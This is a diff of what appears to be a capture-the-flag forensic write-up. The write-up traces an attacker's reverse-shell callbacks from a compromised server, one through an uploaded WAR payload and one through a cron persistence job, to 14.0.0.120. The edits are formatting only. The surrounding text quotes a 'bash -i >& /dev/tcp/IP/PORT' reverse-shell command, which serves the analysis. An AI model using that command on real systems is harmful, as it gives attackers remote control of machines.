@@ -131,7 +131,7 @@ The 443 connection at frame 20689 is that cron job firing, so the attacker delib
 - Second Connection:
 
 <img src="./images/media/image5.png" style="width:6.26772in;height:2.13889in" />
-*Figure 14: The persistence callback return a shell of the compromised server*
+_Figure 14: The persistence callback return a shell of the compromised server_
 
 It isn't really HTTP or TLS:
 Wireshark labels both connections as plain TCP, not HTTP or TLS. bash -i \>& /dev/tcp/IP/PORT opens a raw TCP socket and pipes the shell through it. The port number is only camouflage, and the traffic on 443 should also be cleartext.
@@ -144,5 +144,6 @@ The table below summary callback actions of the attacker:
 | 20646 | 10.0.0.112:55162 → 14.0.0.120:80  | The first reverse shell, triggered by the uploaded WAR payload |
 | 20689 | 10.0.0.112:35790 → 14.0.0.120:443 | The persistence callback, triggered by the cron job            |
 => Answer: 14.0.0.120:443
+
 #Completion
 <img src="./images/media/image15.png" style="width:6.26772in;height:2.375in" />
